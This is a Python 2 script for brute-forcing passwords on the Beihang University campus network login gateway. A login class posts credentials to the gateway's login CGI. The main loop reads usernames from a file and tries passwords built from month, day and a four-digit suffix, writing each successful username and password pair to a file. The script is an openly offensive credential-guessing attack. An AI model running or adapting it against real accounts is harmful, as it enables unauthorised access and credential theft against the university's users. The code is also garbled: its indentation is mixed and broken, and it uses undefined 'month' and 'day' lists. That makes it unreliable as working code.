import urllib2
import cookielib

import urllib
import hashlib

import LoginEncode

class XiaoyuanLogin:
	def __init__(self,username,pwd,enableProxy=False):
		print "Start to Login buaa..."

		self.username = username
		self.password = pwd
		self.enableProxy = enableProxy

		self.serverUrl= "http://gw.buaa.edu.cn/cgi-bin/do_login"
		self.postHeader={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
							'Referer':'http://gw.buaa.edu.cn/'}

	def Login(self):
		self.EnableCookie(self.enableProxy)
		postData = LoginEncode.PostEncode(self.username,self.password)
		#print postData

		request = urllib2.Request(self.serverUrl,postData,self.postHeader)
		print "Post request..."

		try:
			result = urllib2.urlopen(request).read()
			#print result
			if result == "username_error":
				print result
				return False
			elif result == "password_error":
				print result
				return False
			else:
				return True
		except:
			print "Login error"
			return False

	def EnableCookie(self, enableProxy):
		cookie = cookielib.LWPCookieJar()
		cookie_support = urllib2.HTTPCookieProcessor(cookie)

		if enableProxy:
			proxy_support = urllib2.ProxyHandler({'http':'http://xxx.pac'})#use proxy server
			opener = urllib2.build_opener(proxy_support,cookie_support,urllib2.HTTPHandler)
			print "Proxy enabled"
		else:
			opener=urllib2.build_opener(cookie_support,urllib2.HTTPHandler)

		urllib2.install_opener(opener) # construct opener respondent to cookie


if __name__=='__main__':
	f = open('username.txt','r')
	for line in f.readlines():
		username = line.strip() #cut off the space at head and tail
		#username = 'sy1506211'
		password = ''
		for i in range(12):
                        
		    #print i,month[i]
                        tday = ''
		    for j in range(31):
                            tday = day[j]
                            tday = day[j]
                            last = ''
                            for k in range(9999):
                                    if len(str(k)) == 1:
                                            last = '000'+str(k)
                                        
		            elif  len(str(k)) == 2:
		                #print '00'+str(k)
		                last = '00'+str(k)
		            elif  len(str(k)) == 3:
		                #print '0'+str(k)
		                last = '0'+str(k)
		            else:
						#print str(k)
						last = str(k)
					password = month[i]+day[j]+last
					print username,password
					#password = '02095297'
					mylogin = XiaoyuanLogin(username,password)
					if mylogin.Login() == True:
						print "[+]Login success!"
						print username + ':' + password
						fp = open('up.txt','a')
						fp.write(username+'\t'+password+'\n')
						fp.close()
					else:
						print "[+]Login failed!"
